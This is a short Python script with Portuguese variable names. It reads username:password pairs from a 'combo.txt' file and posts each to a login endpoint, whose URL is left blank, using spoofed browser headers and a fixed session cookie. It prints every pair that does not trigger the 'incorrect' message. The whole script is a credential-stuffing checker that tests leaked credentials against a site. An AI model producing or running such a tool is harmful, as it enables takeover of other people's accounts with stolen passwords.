import requests

contas = open("./combo.txt", "r").readlines()

url = ""
contador = 0

for linha in contas:
    conta = linha.strip().split(":")
    contador +=1

    headers={
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Connection":"keep-alive",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 OPR/94.0.0.0 (Edition std-1)",
        "Cookie":"PHPSESSID=5daq3g3rvrhbvpd4c5nj67j574",
        "X-Requested-With": "XMLHttpRequest",
        "name": conta[0],
        "pass": conta[1],
    }

    resposta = requests.post(url, data=headers).text
    # arquivo = open("./resposta.html", "w")
    # arquivo.write(resposta)
    if 'Account name or password are incorrect' not in resposta:
        print(f"[{contador}] {conta[0]} : {conta[1]}")

# arquivo.close()
print("Fim!")
